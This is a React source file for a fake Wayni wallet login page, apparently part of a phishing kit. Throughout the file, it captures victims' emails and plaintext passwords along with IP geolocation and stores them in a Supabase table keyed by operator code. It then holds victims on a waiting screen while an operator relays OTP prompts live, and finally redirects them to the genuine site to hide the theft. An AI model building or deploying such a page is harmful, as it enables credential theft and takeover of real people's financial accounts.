import { useState, useEffect, useCallback } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import WayniLoginForm from "@/components/wayni/WayniLoginForm";
import WayniWaitingScreen from "@/components/wayni/WayniWaitingScreen";
import WayniOtpScreen from "@/components/wayni/WayniOtpScreen";
import WayniSuccessScreen from "@/components/wayni/WayniSuccessScreen";
import wayniBgPattern from "@/assets/wayni-bg-pattern.svg";
import storeApple from "@/assets/wayni-store-apple.jpeg";
import storeGoogle from "@/assets/wayni-store-google.jpeg";

type Step = "login" | "waiting" | "otp" | "finalizing" | "done";

const WAYNI_REDIRECT_URL = "https://app.wayni.com.ar";

const Wayni = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [finalizingMessage, setFinalizingMessage] = useState("Estamos verificando tus datos con seguridad...");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    document.title = "Wayni — Accedé a tu billetera";
    const link = document.querySelector("link[rel='icon']") as HTMLLinkElement;
    if (link) link.href = "data:,";
  }, []);

  const parseLoginError = useCallback((rawError?: string) => {
    const normalized = (rawError || "").toLowerCase();
    if (normalized.includes("email") && (normalized.includes("válido") || normalized.includes("valid")))
      return { message: "Ingresá un email válido.", sessionStatus: "invalid_email" };
    if (normalized.includes("senha") || normalized.includes("password") || normalized.includes("contraseña") || normalized.includes("invalid") || normalized.includes("incorrect") || normalized.includes("incorrecta"))
      return { message: "Email o contraseña incorrectos. Intentá de nuevo.", sessionStatus: "wrong_password" };
    if (normalized.includes("rate limit") || normalized.includes("429") || normalized.includes("too many"))
      return { message: "Demasiados intentos. Esperá unos minutos.", sessionStatus: "rate_limited" };
    if (normalized.includes("bloquead") || normalized.includes("blocked"))
      return { message: "Cuenta bloqueada. Contactá al soporte.", sessionStatus: "account_blocked" };
    if (normalized.includes("no existe") || normalized.includes("not found"))
      return { message: "Cuenta no encontrada.", sessionStatus: "account_not_found" };
    if (normalized.includes("network") || normalized.includes("conex") || normalized.includes("fetch") || normalized.includes("timeout"))
      return { message: "Error de conexión. Verificá tu internet.", sessionStatus: "connection_error" };
    return { message: "No pudimos iniciar sesión. Intentá de nuevo.", sessionStatus: "login_error" };
  }, []);

  // Finalizing redirect
  useEffect(() => {
    if (step !== "finalizing") return;
    setFinalizingMessage("Estamos verificando tus datos con seguridad...");
    const t1 = setTimeout(() => setFinalizingMessage("Aguardá un momento más..."), 1800);
    const t2 = setTimeout(() => setFinalizingMessage("¡Todo listo! Redirigiendo..."), 3600);
    const t3 = setTimeout(() => window.location.assign(WAYNI_REDIRECT_URL), 4600);
    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
  }, [step]);

  // Realtime listener
  useEffect(() => {
    if (!sessionId || step === "login" || step === "done" || step === "finalizing") return;
    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel.on("broadcast", { event: "otp_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
    const poll = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data) handleDecision(data.status);
    }, 3000);
    return () => { supabase.removeChannel(channel); supabase.removeChannel(otpChannel); clearInterval(poll); };
  }, [sessionId, step]);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;
    if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
      setError(""); setErrorMessage(""); setStep("finalizing");
    } else if (status === "wrong_password") { setErrorMessage("Email o contraseña incorrectos."); setStep("login"); }
    else if (status === "account_not_found") { setErrorMessage("Cuenta no encontrada."); setStep("login"); }
    else if (status === "account_blocked") { setErrorMessage("Cuenta bloqueada."); setStep("login"); }
    else if (status === "rate_limited") { setErrorMessage("Demasiados intentos."); setStep("login"); }
    else if (["connection_error", "login_error"].includes(status)) { setErrorMessage("Error al iniciar sesión."); setStep("login"); }
    else if (["redirect_otp", "show_otp"].includes(status)) { setStep("otp"); setErrorMessage(""); }
    else if (status === "otp_rejected") { setErrorMessage("Código incorrecto."); setStep("otp"); }
  }, []);

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);

    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
    } catch {}

    let currentSessionId = sessionId;
    try {
      if (currentSessionId) {
        await supabase.from("sessions").update({ email: submittedEmail, password, status: "pending_review" }).eq("id", currentSessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail, password, ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "pending_review", source: "wayni", operator_code: operatorCode,
        });
        setSessionId(newId); currentSessionId = newId;
      }
    } catch {}

    // For now, just go to waiting (admin-controlled flow)
    setStep("waiting");
    setLoading(false);
  }, [sessionId, operatorCode]);

  const handleOtpSubmit = useCallback(async (code: string) => {
    if (!sessionId) return;
    setError(""); setErrorMessage(""); setLoading(true);
    try {
      await supabase.from("sessions").update({ otp_code: code, status: "otp_submitted" }).eq("id", sessionId);
      setStep("waiting");
    } catch { setError("Error al enviar el código."); }
    setLoading(false);
  }, [sessionId]);

  const renderContent = () => {
    switch (step) {
      case "login": return <WayniLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />;
      case "waiting": return <WayniWaitingScreen email={email} />;
      case "finalizing": return <WayniWaitingScreen email={email} message={finalizingMessage} />;
      case "otp": return <WayniOtpScreen email={email} />;
      case "done": return <WayniSuccessScreen email={email} />;
    }
  };

  // ─── MOBILE ───
  const mobileContent = (
    <div className="flex min-h-screen flex-col bg-[#c8e64a] md:hidden relative overflow-hidden">
      {/* Background pattern */}
      <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
        <img src={wayniBgPattern} alt="" className="w-[140%] max-w-none opacity-60" />
      </div>

      {/* Logo */}
      <div className="relative z-10 flex justify-center pt-12 pb-6">
        <span className="text-[40px] font-black text-[#1a1a1a] tracking-tight" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
      </div>

      {/* Spacer */}
      <div className="flex-1 relative z-10" />

      {/* Bottom card */}
      <div className="relative z-10 bg-white rounded-t-3xl px-6 pt-8 pb-8 shadow-2xl">
        {renderContent()}
      </div>
    </div>
  );

  // ─── DESKTOP ───
  const desktopContent = (
    <div className="hidden md:flex min-h-screen bg-[#c8e64a] relative overflow-hidden">
      {/* Background pattern */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        <img src={wayniBgPattern} alt="" className="absolute right-0 top-1/2 -translate-y-1/2 w-[60%] opacity-50" />
      </div>

      {/* Top nav */}
      <nav className="absolute top-0 left-0 right-0 z-20 px-10 py-5 flex items-center justify-between">
        <span className="text-[28px] font-black text-[#1a1a1a] tracking-tight" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
        <div className="flex items-center gap-8">
          <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Préstamos</span>
          <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Centro de ayuda</span>
          <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Blog</span>
        </div>
      </nav>

      {/* Left content */}
      <div className="relative z-10 flex-1 flex flex-col justify-center px-10 lg:px-16 xl:px-24 max-w-[55%]">
        <h1 className="text-[48px] lg:text-[56px] font-black text-[#1a1a1a] leading-[1.1] mb-6" style={{ fontFamily: "'Inter', sans-serif" }}>
          Porque ahora podés
        </h1>
        <p className="text-[16px] text-[#333] mb-6 max-w-[480px]">
          Descubrí una nueva forma de manejar tu plata.
        </p>
        <div className="flex flex-col gap-3 mb-8">
          <div className="flex items-center gap-2.5">
            <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center">
              <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
            </span>
            <span className="text-[15px] text-[#1a1a1a] font-medium">Financiate de la mejor forma con Adelantos</span>
          </div>
          <div className="flex items-center gap-2.5">
            <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center">
              <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
            </span>
            <span className="text-[15px] text-[#1a1a1a] font-medium">Enviá y recibí plata en el momento</span>
          </div>
          <div className="flex items-center gap-2.5">
            <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center">
              <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
            </span>
            <span className="text-[15px] text-[#1a1a1a] font-medium">Comprá donde quieras con tu tarjeta Mastercard</span>
          </div>
        </div>

        {/* Store badges */}
        <div className="bg-white rounded-2xl px-6 py-4 inline-flex items-center gap-3 shadow-sm w-fit">
          <span className="text-[13px] font-semibold text-[#1a1a1a]">Impulsá tus finanzas con Wayni</span>
          <img src={storeGoogle} alt="Google Play" className="h-[36px] rounded-md" />
          <img src={storeApple} alt="App Store" className="h-[36px] rounded-md" />
        </div>
      </div>

      {/* Right form card */}
      <div className="relative z-10 flex items-center justify-center px-8 lg:px-12" style={{ minWidth: 380, maxWidth: 460 }}>
        <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-[420px]">
          {renderContent()}
        </div>
      </div>
    </div>
  );

  return (
    <>
      {mobileContent}
      {desktopContent}
    </>
  );
};

export default Wayni;
